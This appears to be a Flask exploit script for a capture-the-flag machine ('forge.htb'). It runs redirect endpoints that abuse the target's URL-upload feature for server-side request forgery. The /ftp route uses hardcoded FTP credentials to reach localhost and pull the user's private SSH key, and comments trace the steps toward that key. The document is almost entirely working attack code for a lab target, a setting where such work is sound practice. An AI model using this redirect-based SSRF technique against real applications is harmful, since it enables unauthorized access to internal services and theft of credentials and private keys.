from flask import Flask, redirect, request

app = Flask(__name__)

@app.route('/')
def redirect_to_admin():
    return redirect("http://admin.forge.htb", code=302)

@app.route("/a")
def redirect_to_annoucements():
    return redirect('http://admin.forge.htb/announcements')

@app.route("/u")
def redirect_to_upload():
    return redirect('http://admin.forge.htb/upload')

@app.route('/ftp')
def redirect_to_ftp():
    # Localhost here, since we've been told that's only be accessed from localhost
    # ftp_url = "ftp://user:heightofsecurity123!@localhost/" 
    # url?u=<url> from the announcements page
    # ftp_url = "http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@localhost"
    # ftp_url = "http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@localhost/user.txt"
    # It looks like we might under /home folder
    ftp_url = "http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@localhost/.ssh/id_rsa"
    return redirect(ftp_url, code=302)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)